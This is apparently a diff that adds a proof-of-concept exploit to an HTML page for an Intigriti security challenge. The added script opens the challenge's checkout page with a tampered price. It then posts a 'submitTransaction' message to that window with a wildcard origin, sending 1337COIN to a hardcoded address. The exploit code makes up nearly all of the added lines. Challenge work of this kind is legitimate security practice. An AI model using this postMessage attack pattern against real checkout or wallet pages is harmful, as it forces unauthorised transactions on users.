@@ -21,6 +21,22 @@ document.addEventListener('DOMContentLoaded', () => {
     }, '*');
   }, 10);
 });
+const win = window.open("https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=0.00001");
+
+setTimeout(() => {
+  win.postMessage({
+    type: "submitTransaction",
+    transaction: {
+          currency: "1337COIN",
+          amount: 10,
+          toAddress: "1d5b50c72f40a62df2df484770237f4c35"
+    }
+  }, "*");
+}, 300);
+
+
+
+
 </script>
 
 <iframe
